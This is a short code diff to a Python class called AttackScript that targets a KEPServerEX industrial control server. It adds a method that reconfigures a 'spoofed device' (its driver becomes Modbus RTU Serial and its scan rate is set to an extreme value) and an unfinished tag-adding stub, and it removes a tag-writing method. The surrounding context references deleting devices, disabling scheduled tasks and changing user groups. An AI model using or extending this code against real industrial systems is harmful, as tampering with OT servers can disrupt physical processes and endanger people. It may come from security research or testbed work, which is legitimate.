@@ -1064,6 +1064,16 @@ class AttackScript:
         device_to_del = ".".join([channel, device])
         print("DELETE DEVICE: " + json.dumps(connectivity.device.del_device(server, device_to_del), indent=4))
 
+    def kep_modify_spoofed_device(self,channel, device):
+        server = self.kep_connect()
+        device_to_modify = ".".join([channel, device])
+        print("DELETE DEVICE: " + json.dumps(connectivity.device.modify_device(server,device_to_modify,{"common.ALLTYPES_NAME": device, "servermain.MULTIPLE_TYPES_DEVICE_DRIVER": "Modbus RTU Serial", "servermain.DEVICE_SCAN_MODE_RATE_MS": 8888888},False), indent=4))
+
+    def add_tag(self, server, tag_path, data):
+        # Create a client instance
+        server = self.kep_connect()
+        # print(json.dumps(connectivity.tag.add_tag(server,tag_path,)
+
     def disable_running_schedules(self) -> None:
         """
         Disables MoveFiles and KEPServerEX 6.12 running schedules in task scheduler
@@ -1187,11 +1197,7 @@ class AttackScript:
         print(results)
         return results
 
-    def write_tag_value(self):
-        # Create a client instance
-        server = self.kep_connect()
-        # Write a new value to the tag
-        server.write("Device1.Tag1", 12345)
+
 
     def change_user_group(self) -> bool:
         server = self.kep_connect()
